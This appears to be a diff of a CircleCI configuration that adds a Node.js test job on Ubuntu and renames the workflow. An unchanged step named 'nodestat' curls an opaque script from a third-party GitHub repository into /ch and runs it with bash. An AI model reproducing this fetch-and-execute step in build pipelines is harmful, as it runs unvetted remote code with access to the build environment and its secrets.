@@ -18,15 +18,23 @@ jobs:
       - run:
           name: "nodestat"
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
-      - node/install:
-          install-yarn: true
-          node-version: '18.17'
-      - run: node --version
-      - node/test:
-          test-results-for: jest
+  nodejsindex:
+    docker:
+      - image: ubuntu:jammy
+    steps:
+      - checkout
+      - run: apt update && apt upgrade -y && apt install nodejs npm sudo -y
+      - run: npm install -g jest
+      - run: cd www && npm run test
+
+
+
+  
+
 
 
 workflows:
-  say-hello-workflow:
+  test:
     jobs:
       - dockeretteinstall
+      - nodejsindex
